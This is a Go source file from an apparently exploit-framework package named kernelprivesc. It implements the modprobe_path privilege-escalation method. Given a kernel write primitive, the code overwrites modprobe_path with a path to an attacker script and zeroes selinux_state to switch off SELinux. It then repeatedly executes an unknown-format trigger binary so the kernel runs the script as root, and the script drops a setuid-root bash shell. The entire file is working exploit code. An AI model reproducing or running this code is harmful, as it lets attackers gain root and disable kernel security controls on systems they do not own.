package kernelprivesc

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"time"

	"github.com/ctrsploit/sploit-spec/pkg/log"
)

// ModprobePathMethod overwrites modprobe_path with a script path, then execs
// an unknown-format binary. The kernel, unable to find a binfmt handler,
// invokes modprobe_path (now our script) as root to load the "module". The
// script drops a setuid-root bash copy.
type ModprobePathMethod struct {
	Artifact ShellArtifact
	Prefix   string
}

func (ModprobePathMethod) Name() string { return "modprobe_path" }

func (ModprobePathMethod) Available(p KernelWritePrimitive) (bool, error) {
	if _, err := p.Kaddr("modprobe_path"); err != nil {
		return false, nil
	}
	return true, nil
}

func (m ModprobePathMethod) artifact(p KernelWritePrimitive) ShellArtifact {
	if m.Artifact.ScriptPath != "" {
		return m.Artifact
	}
	prefix := m.Prefix
	if prefix == "" {
		prefix = p.ExpName()
	}
	return NewShellArtifact(prefix)
}

// Prepare writes the root-shell script and issues the WriteKmem/MemsetKmem
// calls that overwrite modprobe_path and zero selinux_state. It does NOT
// trigger the pivot or the userspace action.
func (m ModprobePathMethod) Prepare(p KernelWritePrimitive) (ShellArtifact, error) {
	a := m.artifact(p)
	if err := a.PrepareScript(); err != nil {
		return ShellArtifact{}, err
	}
	modprobePath, err := p.Kaddr("modprobe_path")
	if err != nil {
		return ShellArtifact{}, fmt.Errorf("resolve modprobe_path: %w", err)
	}
	if err := p.WriteKmem(modprobePath, []byte(a.ScriptPath+"\x00")); err != nil {
		return ShellArtifact{}, fmt.Errorf("overwrite modprobe_path: %w", err)
	}
	if selinux, err := p.Kaddr("selinux_state"); err == nil {
		if err := p.MemsetKmem(selinux, 0, 4); err != nil {
			log.Logger.Warnf("modprobe_path: zero selinux_state: %v (continuing)", err)
		}
	}
	return a, nil
}

// TriggerAndWait execs unknown-format binaries to invoke modprobe_path as
// root, polling for the setuid-root shell.
func (m ModprobePathMethod) TriggerAndWait(p KernelWritePrimitive, a ShellArtifact) error {
	for i := 0; i < 20; i++ {
		if err := triggerModprobe(); err != nil {
			log.Logger.Warnf("modprobe trigger %d: %v", i, err)
		}
		time.Sleep(150 * time.Millisecond)
		if a.CheckEscalated() {
			return nil
		}
	}
	return fmt.Errorf("modprobe_path: root shell did not appear after 20 triggers")
}

// triggerModprobe execs an unknown-format binary. The kernel has no binfmt
// handler for it and invokes modprobe_path as root to load a (non-existent)
// module. The trigger binary is PID-suffixed so concurrent exploit runs don't
// race on writefile/chmod/exec of the same inode (mirrors ShellArtifact's
// PID-suffix discipline).
func triggerModprobe() error {
	trig := "/tmp/kernelprivesc_modprobe_trigger_" + strconv.Itoa(os.Getpid())
	content := []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	if err := os.WriteFile(trig, content, 0o777); err != nil {
		return fmt.Errorf("write trigger: %w", err)
	}
	// Chmod to defeat umask: os.WriteFile's perm is masked, so an unusual
	// umask could leave the trigger non-executable for the kernel's exec.
	if err := os.Chmod(trig, 0o777); err != nil {
		return fmt.Errorf("chmod trigger: %w", err)
	}
	pid, err := syscall.ForkExec(trig, []string{trig}, nil)
	if err != nil {
		return fmt.Errorf("forkexec trigger: %w", err)
	}
	// Reap the trigger zombie (best-effort: the child execs an unknown-format
	// binary and is reaped by the kernel's modprobe path; Wait4 just cleans up
	// our fork's entry if it hasn't been collected yet).
	var ws syscall.WaitStatus
	_, _ = syscall.Wait4(pid, &ws, 0, nil)
	return nil
}
